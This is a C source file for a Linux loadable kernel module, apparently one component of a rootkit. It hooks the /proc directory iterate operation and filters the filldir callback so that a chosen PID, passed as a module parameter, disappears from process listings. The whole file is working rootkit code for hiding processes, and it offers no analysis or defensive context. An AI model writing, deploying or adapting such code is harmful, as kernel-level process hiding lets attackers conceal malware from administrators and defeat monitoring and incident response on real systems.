#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>

#include "../../headers/headers.h"

long my_pid = 1;
char *path = "/proc";

module_param(my_pid, long, 0);
module_param(path, charp, 0);

int (*real_iterate)(struct file *filp, struct dir_context *ctx);

int (*real_filldir)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);

int fake_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type)
{
	char *endp;
	long pid;

	pid = simple_strtol(name, &endp, 10);
	
	if(pid == my_pid)
	{
		printk("Hiding pid: %ld\n", pid);
		return 0;
	}

	return real_filldir(ctx, name, namlen, offset, ino, d_type);
}

int fake_iterate(struct file *filp, struct dir_context *ctx)
{
	real_filldir = ctx->actor;
	ctx->actor = fake_filldir;

	return real_iterate(filp, ctx);
}

static int hide_proc_init(void)
{
	set_file_op(iterate_shared, path, fake_iterate, real_iterate);

	if(!real_iterate)
	{
		return -ENOENT;
	}

	return 0;
}

static void hide_proc_exit(void)
{
	if(real_iterate)
	{
		void *dummy;
		set_file_op(iterate_shared, path, real_iterate, dummy);
	}

	return;
}

module_init(hide_proc_init);
module_exit(hide_proc_exit);
MODULE_LICENSE("GPL");
